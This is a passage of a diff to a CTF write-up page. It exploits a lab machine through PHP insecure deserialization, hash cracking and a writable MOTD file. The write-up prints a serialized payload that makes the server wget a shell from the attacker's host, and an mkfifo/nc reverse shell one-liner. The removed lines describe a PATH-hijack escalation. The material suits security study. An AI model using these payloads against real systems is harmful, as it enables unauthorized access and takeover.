+<span class="k">class</span> <span class="nc">FormSubmit</span> <span class="p">{</span>
+<span class="k">public</span> <span class="nv">$form_file</span> <span class="o">=</span> <span class="s1">&#39;message.txt&#39;</span><span class="p">;</span>
+<span class="k">public</span> <span class="nv">$message</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="k">public</span> <span class="k">function</span> <span class="nf">SaveMessage</span><span class="p">()</span> <span class="p">{</span>
+<span class="nv">$NameArea</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span> 
+<span class="nv">$EmailArea</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
+<span class="nv">$TextArea</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;comments&#39;</span><span class="p">];</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span> <span class="na">message</span> <span class="o">=</span> <span class="s2">&quot;Message From : &quot;</span> <span class="o">.</span> <span class="nv">$NameArea</span> <span class="o">.</span> <span class="s2">&quot; || From Email : &quot;</span> <span class="o">.</span> <span class="nv">$EmailArea</span> <span class="o">.</span> <span class="s2">&quot; || Comment : &quot;</span> <span class="o">.</span> <span class="nv">$TextArea</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
 <span class="p">}</span>
+
+<span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">form_file</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">message</span><span class="p">,</span><span class="nx">FILE_APPEND</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s1">&#39;Your submission has been successfully saved!&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="c1">// Leaving this for now... only for debug purposes... do not touch!</span>
+<span class="hll"><span class="nv">$debug</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span><span class="hll"><span class="nv">$messageDebug</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$debug</span><span class="p">);</span>
+</span><span class="hll"><span class="nv">$application</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormSubmit</span><span class="p">;</span>
+</span><span class="hll"><span class="nv">$application</span> <span class="o">-&gt;</span> <span class="na">SaveMessage</span><span class="p">();</span>
+</span><span class="cp">?&gt;</span>
 </code></pre></div></td></tr></table></div>
-<p><img id="image10" /></p>
-<p>Since the command did not have an absolute path to the binary, it was easy for exploitation with a custom path. I created a binary named <code>/tmp/systemctl</code> that executes <code>/bin/bash</code>, added <code>/tmp</code> to the PATH variable, and successfully elevated my privileges.</p>
-<p><img id="image11" /></p>
-<p>✅ Root Flag obtained.</p>
+<p>This code segment caught my attention, as it attempted to unserialize an object based on user input from the GET parameter.</p>
+<div class="highlight"><pre><span></span><code><span class="x">$debug = $_GET[&#39;debug&#39;] ?? &#39;&#39;; </span>
+<span class="x">$messageDebug = unserialize($debug); </span>
+</code></pre></div>
+<p>Further examination revealed a <strong>destructor</strong> function executed during termination, creating or appending a file on the web server. This showed a classic insecure object serialization vulnerability.</p>
+<h2 id="initial-access"><b>Initial Access</b><a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
+<p>I crafted a <strong>payload.php</strong> with same PHP class and variables, and I created a system command to download a reverse shell from my Python server.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="sd">/**</span>
+<span class="sd"> * </span>
+<span class="sd"> */</span>
+<span class="k">class</span> <span class="nc">FormSubmit</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$form_file</span> <span class="o">=</span> <span class="s1">&#39;file.php&#39;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$message</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php system(&quot;wget http://10.17.3.217:8000/shell.php -O shell.php&quot;) ?&gt;&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormSubmit</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div>
+<p>Upon executing this PHP file, I obtained its associated serialized object. </p>
+<div class="highlight"><pre><span></span><code><span class="n">O</span><span class="o">:</span><span class="m">10</span><span class="o">:</span><span class="s">&quot;FormSubmit&quot;</span><span class="o">:</span><span class="m">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="m">9</span><span class="o">:</span><span class="s">&quot;form_file&quot;</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="m">8</span><span class="o">:</span><span class="s">&quot;file.php&quot;</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="m">7</span><span class="o">:</span><span class="s">&quot;message&quot;</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="m">70</span><span class="o">:</span><span class="s">&quot;&lt;?php system(&quot;</span><span class="n">wget</span><span class="w"> </span><span class="n">http</span><span class="o">://</span><span class="m">10.17</span><span class="n">.</span><span class="m">3.217</span><span class="o">:</span><span class="m">8000</span><span class="o">/</span><span class="n">shell.php</span><span class="w"> </span><span class="o">-</span><span class="n">O</span><span class="w"> </span><span class="n">shell.php</span><span class="s">&quot;) ?&gt;&quot;</span><span class="p">;}</span>
+</code></pre></div>
+<p>The website had a form request and Using Burp Suite, I intercepted the form request and customised debug parameter to my requirements. </p>
+<p><img id="image4" /></p>
+<p>Injecting the serialized payload into the <code>debug</code> parameter, the object was deserialized, extracting the values of <strong>form_file</strong> and <strong>message</strong> I provided.</p>
+<p><img id="image5" /></p>
+<p><img id="image6" /></p>
+<p>Assuming that <code>file.php</code> was already created, I accessed the file while listening on my end, immediately got a reverse shell. </p>
+<div class="highlight"><pre><span></span><code>http://10.10.155.251/file.php
+</code></pre></div>
+<p><img id="image7" /></p>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<h3 id="gaining-user-access-james">Gaining user access (James)<a class="headerlink" href="#gaining-user-access-james" title="Permanent link">&para;</a></h3>
+<p>The current user was identified as <code>www-html</code>. Seeking to escalate privileges, I explored the <strong>/home</strong> directory and discovered a user named <code>james</code>. Running linpeas.sh and inspecting hidden files, I located <code>.htpasswd</code>, containing James's password hash. Using hashcat, I successfully decrypted the password.</p>
+<div class="highlight"><pre><span></span><code>james:$apr1$zPZx2A<del class="critic">REDACTED</del>3b9UTt9Nq1
+</code></pre></div>
+<p>Closing the current shell, I logged in via the SSH service on port 22, finding the <strong>user.txt</strong> flag. </p>
+<h3 id="gaining-root-access">Gaining root access<a class="headerlink" href="#gaining-root-access" title="Permanent link">&para;</a></h3>
+<p>Subsequently, my focus shifted to elevating privileges to root. A note in the system: <code>Note-To-James.txt</code> hinted at a custom SSH banner. </p>
+<div class="highlight"><pre><span></span><code>Dear James,
+
+As you may already know, we are soon planning to submit this machine to THM&#39;s CyberSecurity Platform! Crazy... Isn&#39;t it? 
+
+But there&#39;s still one thing I&#39;d like you to do, before the submission.
+
+Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D
+
+I gave you access to modify all these files :) 
+
+Oh and one last thing... You gotta hurry up! We don&#39;t have much time left until the submission!
+
+Best Regards,
+
+rootv
+</code></pre></div>
+<p>Researching online, I discovered that modifying the <strong>MOTD</strong> file in the <code>/etc/</code> directory could achieve this. Upon locating the motd file, identified as executable and writable, I appended a reverse shell code, ultimately achieving root access!</p>
+<div class="highlight"><pre><span></span><code>rm<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/f<span class="w"> </span><span class="p">|</span><span class="w"> </span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span><span class="m">10</span>.17.3.217<span class="w"> </span><span class="m">5432</span><span class="w"> </span>&gt;/tmp/f
+</code></pre></div>
+<p><img id="image8" /></p>
 <script>
 
 // JSON object
 const data = {
-    "desc": "Exploit a recent code injection vulnerability to take over a website full of cute dog pictures!",
-    "ip":  "10.10.46.35",
-    "ports": "22/tcp,ssh,OpenSSH 8.0 (protocol 2.0);80/tcp,http,Golang net/http server (Go-IPFS json-rpc or InfluxDB API)",
+    "desc": "Linux Machine CTF! You'll learn about enumeration, finding hidden password files and how to exploit php deserialization!",
+    "ip":  "10.10.155.251",
+    "ports": "22/tcp,ssh,OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux protocol 2.0);80/tcp,http,Apache httpd 2.4.18 ((Ubuntu))",
     "difficulty":"medium",
-    "id": "4"
+    "id": "5"
 }
 
 
@@ -1046,7 +1100,7 @@ updateHTML();
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../biohazard/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Biohazard" rel="prev">
+          <a href="../dejavu/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Dejavu" rel="prev">
             <div class="md-footer__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
             </div>
@@ -1055,26 +1109,11 @@ updateHTML();
                 Previous
               </span>
               <div class="md-ellipsis">
-                Biohazard
+                Dejavu
               </div>
             </div>
           </a>
         
-        
-          
-          <a href="../debug/" class="md-footer__link md-footer__link--next" aria-label="Next: Debug" rel="next">
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              <div class="md-ellipsis">
-                Debug
-              </div>
-            </div>
-            <div class="md-footer__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
-            </div>
-          </a>
         
       </nav>
     
